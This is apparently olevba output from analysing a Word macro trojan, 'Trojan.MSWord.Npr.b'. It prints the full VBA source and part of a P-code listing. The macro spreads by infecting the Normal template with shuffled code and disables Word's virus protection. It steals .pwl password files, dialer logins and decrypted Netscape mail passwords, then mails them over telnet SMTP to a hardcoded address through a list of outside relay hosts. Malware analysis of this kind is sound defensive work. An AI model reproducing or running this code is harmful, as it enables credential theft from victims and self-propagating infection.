olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Npr.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Npr.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSPluss.bas 
in file: ./Trojan.MSWord.Npr.b - OLE stream: 'Macros/VBA/MSPluss'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'NetscapePasswordReminder
Option Explicit
Type FILETIME
  dwLowDateTime As Long
  dwHighDateTime As Long
End Type
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As FILETIME) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias _
"FindWindowA" (ByVal lpClassName As Any, _
ByVal lpWindowName As Any) As Long
Sub CopyLines(Source As Object)
On Error Resume Next
     Dim SourceM As Object, TargetM As Object
     Dim n As Long
     Dim Body As String
     Dim VBComponent  As Object
    For Each VBComponent In Source.VBProject.VBComponents
     Set SourceM = VBComponent
     n = SourceM.CodeModule.CountOfLines
     Body = SourceM.CodeModule.Lines(1, 1)
     If InStr(1, Body, "NetscapePasswordReminder", vbTextCompare) <> 0 Then
     Body = SourceM.CodeModule.Lines(1, n)
     Body = morf(Body)
     Set TargetM = NormalTemplate.VBProject.VBComponents.Add(1)
     TargetM.CodeModule.AddFromString Body
     TargetM.Name = "MSPluss"
     End If
   Next
 End Sub
Function Random1(i As Integer)
Dim Resalt As Integer
Resalt = Int(i * Rnd + 1)
Random1 = Resalt
End Function
' End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Sender_main
End Sub
Function Revers(MyString As String)
 Dim Temp As String, i As Long
 For i = 1 To Len(MyString)
  Temp = Temp + Mid$(MyString, Len(MyString) + 1 - i, 1)
 Next
 Revers = Temp
End Function
' End Sub
Function Decode_(Cod As String)
Dim i As Long
Dim AlfaBet As String
Dim Chop As Integer
Dim HiMask As Integer
Dim LowMask As Integer
Dim HiShift As Integer
Dim LowShift As Integer
Dim Charset As Integer
Dim First As Integer, Second As Integer
Dim Resalt As String
If Cod = "" Then
 Decode_ = ""
 Exit Function
End If
AlfaBet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
Chop = 63
HiMask = 63
LowMask = 0
HiShift = 4
LowShift = 64
Resalt = ""
For i = 1 To Len(Cod)
 Charset = InStr(1, AlfaBet, Mid(Cod, i, 1), vbBinaryCompare) - 1
If Charset >= 0 Then
Second = (Charset And LowMask) / LowShift
If HiMask <> 63 Then
 Resalt = Resalt + Chr$(First + Second)
End If
First = (Charset And HiMask) * HiShift
If HiMask = 0 Then
 HiMask = 63
 LowMask = 0
 HiShift = 4
 LowShift = 64
Else
 HiMask = ((HiMask * 4) And HiMask) / 4
 LowMask = 63 Xor HiMask
 HiShift = HiShift * 4
 LowShift = LowShift / 4
End If
End If
Next
Decode_ = Resalt
End Function
' End Sub
Function FindPWL(j As Integer, FindFiles() As String)
ReDim FindFiles(0)
FindFiles(0) = Dir$("c:\windows\*.pwl")
If FindFiles(0) = "" Then
Exit Function
End If
j = 0
Do While FindFiles(0) <> ""
FindFiles(0) = Dir
j = j + 1
Loop
If j > 1 Then
ReDim FindFiles(0 To j - 1)
FindFiles(0) = Dir$("c:\windows\*.pwl")
For j = 1 To j - 1
FindFiles(j) = Dir$
Next j
Else
FindFiles(0) = Dir$("c:\windows\*.pwl")
End If
End Function
' End Sub
Function Grab_Registr_main()
Dim res As Long, hkey As Long, i As Long
Dim KeyName As String, KeyLen As Long
Dim ClassName As String, ClassLen As Long
Dim lastwrite As FILETIME
Dim res1 As Long, hkey1 As Long, n As Long
Dim KeyName1 As String, KeyLen1 As Long
Dim ClassName1 As String, ClassLen1 As Long
Dim lastwrite1 As FILETIME
Dim userName As String
Dim PassWord As String
Dim Resalt As String
Dim Version As String
Dim j As Long
On Error Resume Next
Resalt = "" + Chr(10) + Chr(13)
res = RegOpenKeyEx(&H80000001, "Software\Netscape\Netscape Navigator\biff\users\", 0, &H8, hkey)
If res <> 0 Then
 Resalt = "Íà ìàøèíå íå óñòàíîâëåíà ïð. Netscape Navigator (èëè íåïîääåðæèâàåìàÿ âåðñèÿ)."
 Grab_Registr_main = Resalt
 Exit Function
End If
i = 0
Do While res = 0
 KeyName = Space(255): ClassName = Space(255)
 KeyLen = 255: ClassLen = 255
 res = RegEnumKeyEx(hkey, i, KeyName, KeyLen, ByVal 0, ClassName, ClassLen, lastwrite)
If res = 0 Then
 KeyName = Left(KeyName, KeyLen)
 ClassName = Left(ClassName, ClassLen)
 
 res1 = RegOpenKeyEx(&H80000001, "Software\Netscape\Netscape Navigator\biff\users\" + KeyName + "\servers\", 0, &H8, hkey1)
n = 0
Do While res1 = 0
 KeyName1 = Space(255): ClassName1 = Space(255)
 KeyLen1 = 255: ClassLen1 = 255  '
 res1 = RegEnumKeyEx(hkey1, n, KeyName1, KeyLen1, ByVal 0, ClassName1, ClassLen1, lastwrite1)
If res1 = 0 Then
 KeyName1 = Left(KeyName1, KeyLen1)
 ClassName1 = Left(ClassName1, ClassLen1)
 userName = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\" + KeyName + "\servers\" + KeyName1, "userName")
 PassWord = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\" + KeyName + "\servers\" + KeyName1, "password")
 Resalt = Resalt + "Ïîëüçîâàòåëü: " + KeyName + _
 Chr(13) + "POP3-ñåðâåð: " + KeyName1 + Chr(13) _
 + "Èìÿ Àêêàóíòà äëÿ POP3-ñåðâåðà: " + userName + Chr(13) _
 + Decode_Password(PassWord) + Chr(10) + Chr(13)
End If
n = n + 1
 Loop
 res1 = RegCloseKey(hkey1)
End If
i = i + 1
j = j + n - 1
DoEvents
Loop
res = RegCloseKey(hkey)
Version = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Netscape\Netscape Navigator", "CurrentVersion")
Resalt = "*ïðîãðàììà òåñòèðîâàíà òîëüêî äëÿ âåðñèè Netscape Navigator 4.51(ru)*" + Chr(10) + Chr(13) + "Ó Âàñ Netscape Navigator - " + Version + Chr(13) + "Ïîëüçîâàòåëåé - " + Str(i - 1) + Chr(13) + "Ïî÷òîâûõ Àêêàóíòîâ - " + Str(j - 1) + Resalt
Grab_Registr_main = Resalt
End Function
' End Sub
Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open "c:\windows\logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub
Function Base64(FName As String)
Dim i As Long
Dim ABC As String
Dim Tmp As String
Dim Char As Byte
Dim Cod As Integer
Dim Roll As Integer
Dim Counter As Long
'
Dim HMask As Integer
Dim LMask As Integer
Dim Shift As Integer
Dim NF As Integer


HMask = 252
LMask = 3
Shift = 16
Roll = 0
Counter = 1
ABC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
NF = FreeFile
On Error Resume Next
Open "c:\windows\" + FName For Binary Access Read As #NF
For i = 1 To LOF(NF)
Get #NF, Counter, Char
Cod = ((Char And HMask) \ (LMask + 1)) Or Roll
Roll = (Char And LMask) * Shift
Tmp = Tmp + Mid$(ABC, Cod + 1, 1)
HMask = HMask * 4 And 255
LMask = LMask * 4 + 3
Shift = Shift \ 4
If HMask = 0 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
 HMask = 252
 LMask = 3
 Shift = 16
 Roll = 0
End If
Counter = Counter + 1
Next
Close #NF
If Shift < 16 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
End If
Cod = ((Len(Tmp)) Mod 4)
If Cod Then
Tmp = Tmp + String$(4 - Cod, "=")
End If
Base64 = Tmp
End Function
' End Sub
Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub
Function ROT_13(Cod As String)
Dim La As String
Dim Smol As String
Dim i As Integer
Dim n As Integer
Dim Char As String
Dim ChNumber As Integer
Dim Tmp As String
La = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Smol = "abcdefghijklmnopqrstuvwxyz"
For i = 1 To Len(Cod)
Char = Mid(Cod, i, 1)
ChNumber = InStr(1, La, Char, vbBinaryCompare)
Select Case ChNumber
 Case 1 To 13
 Tmp = Tmp + Mid(La, ChNumber + 13, 1)
 Case Is > 13
 Tmp = Tmp + Mid(La, ChNumber - 13, 1)
 Case Else
  ChNumber = InStr(1, Smol, Char, vbBinaryCompare)
  Select Case ChNumber
   Case 1 To 13
   Tmp = Tmp + Mid(Smol, ChNumber + 13, 1)
   Case Is > 13
   Tmp = Tmp + Mid(Smol, ChNumber - 13, 1)
   Case Else
   Tmp = Tmp + Char
   End Select
End Select
Next
ROT_13 = Tmp
End Function
' End Sub
Sub FileOpen()
On Error Resume Next
AutoOpen
Dialogs(80).Show
Sender_main
End Sub
Function morf(MyString As String)
Dim NextSub As Long
Dim Counter As Integer
Dim A() As Integer
Dim Code_() As String
Dim i As Long
Dim Pre_ As Long
Dim Resalt As String
On Error Resume Next
NextSub = InStr(1, MyString, "End" + " Sub", vbTextCompare)
Do While NextSub <> 0
Counter = Counter + 1
NextSub = InStr(NextSub + 9, MyString, "End" + " Sub", vbTextCompare)
Loop
ReDim Code_(0 To Counter - 1)

NextSub = -8
For i = 0 To Counter - 1
Pre_ = NextSub + 9
NextSub = InStr(Pre_, MyString, "End" + " Sub", vbTextCompare)
Code_(i) = Mid(MyString, Pre_, NextSub + 9 - Pre_)
Next i
Loto Counter - 1, A()
Resalt = Code_(0)
For i = 1 To Counter - 1
Resalt = Resalt + Code_(A(i))
Next i
morf = Resalt
End Function
' End Sub
Function Decode_Password(Cod As String)
Dim Key As Variant
Dim i As Integer
Dim n As Integer
Dim Title As String
If Cod = "" Then
 Title = "Äàííûé ïîëüçîâàòåëü íå óñòàíîâèë ôëàæîê " + Chr(34) + "Çàïîìíèòü ïàðîëü" + Chr(34)
 Decode_Password = Title
Exit Function
End If
Key = Array(86, 201, 239, 74, 155, 190, 90, 66, 119, 2, 67, 24, 112, 48, 137, 76)
Cod = Revers(Cod)
Cod = ROT_13(Cod)
Cod = Decode_(Cod)
n = Len(Cod)
If n > 16 Then
 n = 16
 Title = "Ïåðâûå øåñòíàäöàòü ñèìâîëîâ ïàðîëÿ: "
Else
 Title = "Ïàðîëü: "
End If
For i = 1 To n
Title = Title + Chr(Asc(Mid(Cod, i, 1)) Xor Key(i - 1))
Next
Decode_Password = Title
End Function
' End Sub
Sub Sender()
Dim i As Long
 i = 0
 For i = 0 To 4
  If Check_Connection = True Then
   Sender_main
   Exit Sub
  Else
   Pause 254
  End If
 Next
End Sub
Sub AutoExec()
 AutoOpen
End Sub
Sub Filler(MessStr As String, hwnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hwnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
    If i Mod 380 = 0 Then
    Pause 1
    End If
   Charset = SendMessage(hwnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub
Sub AutoExit()
Dim Counter As Long
Dim i As Long
Dim Yes As Boolean
Dim VBComponent As Object

On Error Resume Next
  Application.Visible = False
  Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 If VBComponent.Name = "MSPluss" Then
  Yes = True
 End If
 Next
 If Yes = False Then
  Counter = Templates.Count
 For i = 1 To Counter
  If InStr(1, Templates(i).FullName, "STARTUP", vbTextCompare) <> 0 Then
 Templates(i).OpenAsDocument
 CopyLines Templates(i)
 ActiveDocument.Close
 End If
 Next
 End If
 NormalTemplate.Save
 Tmsn
End Sub

Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
Function Check_Connection()
Dim CurrWnd As Long
Dim Length As Long
Dim Title As String
  CurrWnd = FindWindow(CLng(0), "")
  CurrWnd = GetWindow(CurrWnd, 0)
    Do While CurrWnd <> 0
       Length = GetWindowTextLength(CurrWnd)
        Title = Space(Length + 1)
    Length = GetWindowText(CurrWnd, Title, Length + 1)
    If InStr(1, Title, "Connected to", vbTextCompare) <> 0 _
     Or InStr(1, Title, "Ïîäêëþ÷åíî ê", vbTextCompare) <> 0 Then
     Check_Connection = True
     Exit Function
    End If
    CurrWnd = GetWindow(CurrWnd, 2)
    DoEvents
  Loop
  Check_Connection = False
End Function
' End Sub
Sub AutoOpen()
Dim VBComponent As Object
Dim Yes As Boolean
 On Error Resume Next
ActiveDocument.ShowSpellingErrors = False
ActiveDocument.ShowGrammaticalErrors = False
 Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 If VBComponent.Name = "MSPluss" Then
  Yes = True
 End If
 Next
If Yes = False Then
CopyLines MacroContainer
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
NormalTemplate.Save
End Sub
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Randomize
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next
End Function
' End Sub
Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub
Sub AutoClose()
On Error Resume Next
AutoOpen
End Sub

Function Grab(Name As String)
Dim Tmp As String
Dim AZ As String
Dim i As Integer
Dim Num As Integer
Dim PwdLst As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
Dim NF1 As Integer
AZ = "abcdifghijklmnopqastuvwxyz"
For i = 1 To 7
 Num = Random1(25)
 Name = Name + Mid(AZ, Num + 1, 1)
Next
Name = Name + ".egn"
On Error Resume Next
NF1 = FreeFile
Open "c:\windows\" + Name For Output Access Write As #NF1
If Dir$("c:\windows\edialer.ini") <> "" Then
NF = FreeFile
Open "c:\windows\edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Print #NF1, Tmp
  End If
Loop
Close #NF
End If
If Dir$("C:\Windows\system.ini") <> "" Then
NF = FreeFile
Open "C:\Windows\system.ini" For Input Access Read As #NF
Do While Not EOF(NF)
 Line Input #NF, Temp
 Counter = Counter + 1
 If Temp = "[Password Lists]" Then
  Do While Temp <> ""
  Line Input #NF, Temp
  PwdLst = PwdLst + Chr(10) + Temp
  Loop
 Exit Do
 End If
   If Counter Mod 20 = 0 Then
   DoEvents
   End If
Loop
End If
Close #NF
Print #NF1, PwdLst
Print #NF1, Grab_Registr_main()
Close #NF1
End Function
' End Sub
Sub Sender_main()
Dim Handle As Long
Dim HandleBW As Long
Dim hwnd As Long
Dim FileName As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 14) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim Twnd As String
Dim None As String
Dim Kashek As String
Dim RecipientOfMessage_ As String
Dim FNum_ As Integer
Dim Kashelek As String
On Error Resume Next
If Check_Connection = True Then
Kashek = "cmNwdCB0bzogPHNvcmRvbmdAbWFpbC5jb20+"
RecipientOfMessage_ = "<vasya@zoo.kl>"
Host(1) = "ns1.kazna.com"
Host(2) = "mail.iname.com"
Host(3) = "194.186.182.26"
Host(4) = "195.75.32.20"
Host(5) = "lily.bas-net.by"
Host(6) = "212.19.17.57"
Host(7) = "itk2.bas-net.by"
Host(8) = "imaph2.bas-net.by"
Host(9) = "tuna.fsr.com"
Host(10) = "redfish.fsr.com"
Host(11) = "tixi.sakha.ru"
Host(12) = "ns.sovintel.ru"
Host(13) = "jupiter.zetcom.ru"
Host(14) = "nts_future.future.ru"
Loto 14, A()
Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
  If THwnd <> 0 Then
    Twnd = "telnet"
    None = "(none)"
   Else
   THwnd = FindWindow(CLng(0), "Òåëíåò - (íåò)")
   If THwnd <> 0 Then
   Twnd = "Òåëíåò"
    None = "(íåò)"
    Else
   THwnd = FindWindow(CLng(0), "Telnet - (íåò)")
   Twnd = "telnet"
    None = "(íåò)"
  End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
DoEvents
For f = 1 To 5
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), "Connect failed")
 DoEvents
Loop
Select Case Handle
  Case Is <> 0
Kashelek = "Kashelek"
FNum_ = FreeFile
Open "c:\windows\" + Kashelek For Output Access Write As #FNum_
Print #FNum_, RecipientOfMessage_
Close #FNum_
SMTP = "helo My" + Base64(Kashelek) + "#$$mail from: <master@myself.com>#$" + Decode_(Kashek) + "#$rcpt to: " + RecipientOfMessage_ + "#$data#$Date: " + _
 Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
 + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
Filler SMTP, Handle
Pause 1
Kill "C:\Windows\Kashelek"
Grab FileName
SMTP = Base64(FileName)
Kill "c:\windows\" + FileName
SMTP = Adapt(SMTP)
Filler SMTP, Handle
Pause 1
FindPWL i, NPwl()
If i <> 0 Then
 For j = 0 To i - 1
  If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
   SMTP = Base64(NPwl(j))
   SMTP = Adapt(SMTP)
      Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
   + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
   NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
   + Chr(34) + NPwl(j) + Chr(34) + "#"
      Filler Title, Handle
   Pause 1
   Filler SMTP, Handle
   Pause 1
  End If
 Next
End If
Title = "##------=_NextPart--#.#$quit#"
Filler Title, Handle
Pause 1
Start = Timer
Do Until hwnd <> 0 Or Timer - Start > 120
 hwnd = FindWindow(CLng(0), Twnd)
 DoEvents
Loop
Select Case hwnd
Case Is = 0
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hwnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open "c:\windows\logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), Twnd + " - " + None)
SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
Pause 3
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Pause 3
HandleBW = 0
Handle = 0
End Select
Next
End If
End Sub
Function Adapt(Cod As String)
Dim PostCod As String
Dim i As Long
On Error Resume Next
For i = 1 To Len(Cod)
 If i >= 76 And (i Mod 76) = 0 Then
  PostCod = PostCod + Mid(Cod, i, 1) + "#"
  Else
  PostCod = PostCod + Mid(Cod, i, 1)
 End If
Next
Adapt = "#" + PostCod + "#"
End Function
' End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Trojan.MSWord.Npr.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/MSPluss - 40824 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0018 "NetscapePasswordReminder"
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Type FILETIME
' Line #3:
' 	DimImplicit 
' 	VarDefn dwLowDateTime (As Long)
' Line #4:
' 	DimImplicit 
' 	VarDefn dwHighDateTime (As Long)
' Line #5:
' 	EndType 
' Line #6:
' 	FuncDefn (Declare Function RegOpenKeyEx Lib "advapi32.dll" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #7:
' 	FuncDefn (Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long)
' Line #8:
' 	FuncDefn (Declare Function RegEnumKeyEx Lib "advapi32.dll" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As ) As Long)
' Line #9:
' 	FuncDefn (Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long)
' Line #10:
' 	FuncDefn (Declare Function GetWindowText Lib "user32" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long)
' Line #11:
' 	FuncDefn (Declare Function GetWindowTextLength Lib "user32" (ByVal hwnd As Long) As Long)
' Line #12:
' 	FuncDefn (Declare Function SendMessage Lib "user32.dll" (ByVal hwnd As Long, ByVal Msg As Long, wParam As , lParam As ) As Long)
' Line #13:
' 	LineCont 0x0008 06 00 00 00 0D 00 00 00
' 	FuncDefn (Declare Function FindWindow Lib "user32.dll" (ByVal lpClassName As , ByVal lpWindowName As ) As Long)
' Line #14:
' 	FuncDefn (Sub CopyLines(Source As Object))
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	Dim 
' 	VarDefn SourceM (As Object)
' 	VarDefn TargetM (As Object)
' Line #17:
' 	Dim 
' 	VarDefn n (As Long)
' Line #18:
' 	Dim 
' 	VarDefn Body (As String)
' Line #19:
' 	Dim 
' 	VarDefn VBComponent (As Object) 0x0016
' Line #20:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld Source 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #21:
' 	SetStmt 
' 	Ld VBComponent 
' 	Set SourceM 
' Line #22:
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St n 
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	LitStr 0x0018 "NetscapePasswordReminder"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld n 
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #26:
' 	Ld Body 
' 	ArgsLd morf 0x0001 
' 	St Body 
' Line #27:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set TargetM 
' Line #28:
' 	Ld Body 
' 	Ld TargetM 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #29:
' 	LitStr 0x0007 "MSPluss"
' 	Ld TargetM 
' 	MemSt New 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Next 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Function Random1(i As Integer))
' Line #34:
' 	Dim 
' 	VarDefn Resalt (As Integer)
' Line #35:
' 	Ld i 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Resalt 
' Line #36:
' 	Ld Resalt 
' 	St Random1 
' Line #37:
' 	EndFunc 
' Line #38:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #39:
' Line #40:
' 	FuncDefn (Sub FileSave())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	ArgsCall Sender_main 0x0000 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Function Revers(MyString As String))
' Line #46:
' 	Dim 
' 	VarDefn Temp (As String)
' 	VarDefn i (As Long)
' Line #47:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MyString 
' 	FnLen 
' 	For 
' Line #48:
' 	Ld Temp 
' 	Ld MyString 
' 	Ld MyString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Temp 
' Line #49:
' 	StartForVariable 
' 	Next 
' Line #50:
' 	Ld Temp 
' 	St Revers 
' Line #51:
' 	EndFunc 
' Line #52:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #53:
' 	FuncDefn (Function Decode_(Cod As String))
' Line #54:
' 	Dim 
' 	VarDefn i (As Long)
' Line #55:
' 	Dim 
' 	VarDefn AlfaBet (As String)
' Line #56:
' 	Dim 
' 	VarDefn Chop (As Integer)
' Line #57:
' 	Dim 
' 	VarDefn HiMask (As Integer)
' Line #58:
' 	Dim 
' 	VarDefn LowMask (As Integer)
' Line #59:
' 	Dim 
' 	VarDefn HiShift (As Integer)
' Line #60:
' 	Dim 
' 	VarDefn LowShift (As Integer)
' Line #61:
' 	Dim 
' 	VarDefn Charset (As Integer)
' Line #62:
' 	Dim 
' 	VarDefn First (As Integer)
' 	VarDefn Second (As Integer)
' Line #63:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #64:
' 	Ld Cod 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #65:
' 	LitStr 0x0000 ""
' 	St Decode_ 
' Line #66:
' 	ExitFunc 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	LitStr 0x0040 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
' 	St AlfaBet 
' Line #69:
' 	LitDI2 0x003F 
' 	St Chop 
' Line #70:
' 	LitDI2 0x003F 
' 	St HiMask 
' Line #71:
' 	LitDI2 0x0000 
' 	St LowMask 
' Line #72:
' 	LitDI2 0x0004 
' 	St HiShift 
' Line #73:
' 	LitDI2 0x0040 
' 	St LowShift 
' Line #74:
' 	LitStr 0x0000 ""
' 	St Resalt 
' Line #75:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Cod 
' 	FnLen 
' 	For 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld AlfaBet 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld vbBinaryCompare 
' 	FnInStr4 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Charset 
' Line #77:
' 	Ld Charset 
' 	LitDI2 0x0000 
' 	Ge 
' 	IfBlock 
' Line #78:
' 	Ld Charset 
' 	Ld LowMask 
' 	And 
' 	Paren 
' 	Ld LowShift 
' 	Div 
' 	St Second 
' Line #79:
' 	Ld HiMask 
' 	LitDI2 0x003F 
' 	Ne 
' 	IfBlock 
' Line #80:
' 	Ld Resalt 
' 	Ld First 
' 	Ld Second 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Resalt 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Ld Charset 
' 	Ld HiMask 
' 	And 
' 	Paren 
' 	Ld HiShift 
' 	Mul 
' 	St First 
' Line #83:
' 	Ld HiMask 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #84:
' 	LitDI2 0x003F 
' 	St HiMask 
' Line #85:
